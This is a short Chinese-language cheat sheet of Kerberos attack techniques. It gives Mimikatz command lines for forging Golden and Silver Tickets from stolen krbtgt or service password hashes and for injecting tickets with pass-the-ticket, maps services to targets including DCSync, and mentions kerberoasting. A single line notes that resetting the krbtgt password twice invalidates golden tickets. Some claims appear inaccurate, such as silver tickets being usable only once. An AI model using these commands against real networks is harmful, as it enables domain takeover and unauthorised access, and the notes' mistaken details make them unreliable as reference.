Kerberos

kerberos 协议认证流程

1. Client 请求 AS 得到 TGT
2. Client 携带 TGT 请求 TGS 得到 TGT Ticket/ST
3. Client 携带 ST 请求 Server

Golden Ticket

通过伪造高权限的 TGT, 以达到访问域中所有服务的目的

kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /krbtgt:KRBTGTNTLMHASH

添加 /ptt 参数可在直接当前会话中使用 ticket

导入 ticket

kerberos::ptt ticket.kirbi

默认有效时间为 20 分钟, 过期可重新导入

通过快速更改 krbtgt 密码两次可使 golden ticket 失效

Silver Ticket

通过伪造 ST 访问指定服务, 仅能使用一次

kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /target:TARGETFQDN /service:SERVICENAME /rc4:SERVICENTLMHASH

添加 /ptt 参数可在直接当前会话中使用 ticket

其中服务 Hash 还可通过 kerberoast 爆破获取

service

WMI: HOST RPCSS
WinRM: HOST HTTP
Scheduled Tasks: HOST
Windows File Share: CIFS
PowerShell Remoting: HOST HTTP
LDAP operations including Mimikatz DCSync: LDAP
Windows Remote Server Administration Tools: RPCSS LDAP CIFS

导入 ticket

kerberos::ptt ticket.kirbi
